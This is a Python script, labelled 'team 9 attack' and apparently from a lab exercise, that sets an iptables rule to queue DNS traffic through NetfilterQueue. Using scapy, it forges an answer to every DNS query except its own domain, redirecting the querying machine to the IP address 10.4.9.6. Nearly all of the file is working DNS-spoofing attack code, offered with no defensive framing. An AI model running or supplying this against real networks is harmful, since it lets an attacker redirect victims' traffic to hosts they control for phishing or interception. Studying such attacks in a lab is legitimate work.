#intercept.py 
#team 9 attack

# This file utilizes capy and nfqueue to sniff and modify dns packets

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

def process(packet):
   payload =  packet.get_payload()
   pkt = IP(payload)
   if not pkt.haslayer(DNSQR):
       packet.accept()
   else:
       if(str(pkt[DNS].qd.qname) == "bombast.bombast.com."):
            print("Bombast Query, accept and dont manipulate")
            packet.accept()
            print("")
       else:
            #send bombasts ip
	    print("Queued Packet")
            print("Original Packet Info: ")
            print("SRC IP = %s" % str(pkt[IP].src))
            print("DST IP = %s" % str(pkt[IP].dst))
            print("Query = %s" % str(pkt[DNS].qd.qname))
            print("")
            print("Serving Bombast Attack")
            solved_ip = '10.4.9.6'
            newPkt = IP(dst=pkt[IP].src,  src=pkt[IP].dst)/\
                            UDP(dport=pkt[UDP].sport,  sport=pkt[UDP].dport)/\
                            DNS(id = pkt[DNS].id,  qr = 1,  aa =1, qd=pkt[DNS].qd, \
                            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl = 10, rdata = solved_ip))
            print("Spoofed Answer Info: ")
            print("SRC IP = %s" % str(newPkt[IP].src))
            print("DST IP = %s" % str(newPkt[IP].dst))
            print("Query = %s" % str(newPkt[DNS].qd.qname))
            print("Spoofed Answer = %s" % str(newPkt[DNS].an.rdata))
            print("Dropping original packet and sending Spoofed payload")
            packet.set_payload(str(newPkt))
            packet.accept()
    
def main():  
   os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
   q = NetfilterQueue()  
   q.bind(1, process)
    
   try:
        q.run()
        print("Running")
   except KeyboardInterrupt:
        print("exiting....")
        q.unbind()
        os.system('iptables -t nat -F')
        exit(0)

if __name__ == '__main__':
	main()


    
